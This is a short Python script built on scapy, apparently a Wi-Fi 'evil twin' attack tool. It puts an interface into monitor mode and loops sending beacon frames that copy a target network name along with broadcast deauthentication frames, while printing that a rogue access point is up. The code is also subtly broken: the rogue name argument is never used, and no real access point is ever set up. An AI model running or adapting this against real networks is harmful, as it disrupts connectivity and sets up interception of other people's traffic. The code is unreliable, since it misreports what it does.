from scapy.all import *
import os
import sys

def create_rogue_ap(target_ssid, rogue_ssid, interface):
    # Set up the network interface in monitor mode
    os.system(f"iwconfig {interface} mode monitor")

    # Create a beacon frame with the target SSID
    beacon_frame = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC()) / Dot11Beacon(cap="ESS") / Dot11Elt(ID="SSID", info=target_ssid)

    # Create a deauthentication frame to disconnect clients from the target AP
    deauth_frame = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC()) / Dot11Deauth()

    # Continuously send the beacon and deauthentication frames to create the Evil Twin AP
    while True:
        sendp(beacon_frame, iface=interface, verbose=False)
        sendp(deauth_frame, iface=interface, verbose=False)
        print(f"[+] Rogue AP '{rogue_ssid}' created. Clients may connect to it.")

# Usage: python evil_twin.py <target_ssid> <rogue_ssid> <interface>
if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python evil_twin.py <target_ssid> <rogue_ssid> <interface>")
        sys.exit(1)

    target_ssid = sys.argv[1]  # SSID of the legitimate AP
    rogue_ssid = sys.argv[2]   # SSID of the rogue AP (Evil Twin)
    interface = sys.argv[3]    # Network interface (e.g., wlan0)

    create_rogue_ap(target_ssid, rogue_ssid, interface)
